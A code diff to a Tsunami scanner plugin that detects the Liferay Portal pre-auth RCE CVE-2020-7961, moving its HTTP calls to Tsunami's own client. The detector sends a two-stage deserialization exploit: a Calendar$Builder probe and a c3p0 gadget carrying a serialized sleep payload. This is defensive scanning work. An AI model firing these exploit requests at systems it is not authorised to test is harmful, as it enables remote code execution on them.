@@ -24,8 +24,13 @@ import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.common.io.BaseEncoding;
 import com.google.common.io.Resources;
+import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
+import com.google.tsunami.common.net.http.HttpClient;
+import com.google.tsunami.common.net.http.HttpHeaders;
+import com.google.tsunami.common.net.http.HttpRequest;
+import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -45,9 +50,7 @@ import java.time.Duration;
 import java.time.Instant;
 import javax.inject.Inject;
 import okhttp3.FormBody;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
+import okio.Buffer;
 
 /**
  * A {@link VulnDetector} that detects Liferay Portal pre-auth RCE vulnerability (CVE-2020-7961).
@@ -64,28 +67,26 @@ public final class PortalCve20207961Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private static final String VULNERABLE_PATH = "api/jsonws/expandocolumn/add-column";
-
   private static final String STAGE_ONE_CLASS = "java.util.Calendar$Builder";
   private static final String STAGE_ONE_PAYLOAD = "{\"calendarType\": \"TsunamiExceptionPayload\"}";
   private static final String STAGE_ONE_RESPONSE_MATCH =
       "unknown calendar type: TsunamiExceptionPayload";
-
   private static final String STAGE_TWO_CLASS =
       "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource";
   private static final long STAGE_TWO_SLEEP_DURATION_SECONDS = 10;
 
   private final Clock utcClock;
-  private final OkHttpClient httpClient;
   private final Ticker ticker;
+  private final HttpClient httpClient;
 
   private String serializedRCEPayload = null;
 
   @Inject
   PortalCve20207961Detector(
-      @UtcClock Clock utcClock, @StopwatchTicker Ticker ticker, OkHttpClient httpClient) {
+      @UtcClock Clock utcClock, @StopwatchTicker Ticker ticker, HttpClient httpClient) {
     this.utcClock = utcClock;
     this.ticker = ticker;
-    this.httpClient = httpClient.newBuilder().readTimeout(Duration.ofSeconds(20)).build();
+    this.httpClient = httpClient.modify().setConnectTimeout(Duration.ofSeconds(20)).build();
     try {
       this.serializedRCEPayload =
           BaseEncoding.base16()
@@ -120,15 +121,23 @@ public final class PortalCve20207961Detector implements VulnDetector {
         NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_PATH;
 
     // Stage one, verify that we can cause deserialization of an arbitrary non-Portal class.
-    Request request1 =
-        new Request.Builder()
-            .url(vulnerableURL)
-            .post(generateFormBody(STAGE_ONE_CLASS, STAGE_ONE_PAYLOAD))
-            .build();
     Stopwatch stopwatch1 = Stopwatch.createStarted(ticker);
-    try (Response response = httpClient.newCall(request1).execute()) {
+    Buffer sink = new Buffer();
+
+    try {
+      generateFormBody(STAGE_ONE_CLASS, STAGE_ONE_PAYLOAD).writeTo(sink);
+
+      HttpRequest request1 =
+          HttpRequest.post(vulnerableURL)
+              .setHeaders(
+                  HttpHeaders.builder()
+                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
+                      .build())
+              .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
+              .build();
+      HttpResponse response = httpClient.send(request1, networkService);
       stopwatch1.stop();
-      String body = response.body().string();
+      String body = response.bodyString().get();
       if (!body.contains(STAGE_ONE_RESPONSE_MATCH)) {
         return false;
       }
@@ -143,15 +152,21 @@ public final class PortalCve20207961Detector implements VulnDetector {
     String jsonRcePayload =
         String.format(
             "{\"userOverridesAsString\":\"HexAsciiSerializedMap[%s]\"}", serializedRCEPayload);
-    Request request2 =
-        new Request.Builder()
-            .url(vulnerableURL)
-            .post(generateFormBody(STAGE_TWO_CLASS, jsonRcePayload))
-            .build();
     Stopwatch stopwatch2 = Stopwatch.createStarted(ticker);
-    try (Response response = httpClient.newCall(request2).execute()) {
+    try {
+      sink = new Buffer();
+      generateFormBody(STAGE_TWO_CLASS, jsonRcePayload).writeTo(sink);
+      HttpRequest request2 =
+          HttpRequest.post(vulnerableURL)
+              .setHeaders(
+                  HttpHeaders.builder()
+                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
+                      .build())
+              .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
+              .build();
+      HttpResponse response = httpClient.send(request2, networkService);
       stopwatch2.stop();
-      if (response.isSuccessful()) {
+      if (response.status().isSuccess()) {
         // We expect an exception (out of our control) to be thrown.
         // And even if it didn't, the request should fail without creds.
         logger.atInfo().log("Request unexpectedly succeeded");
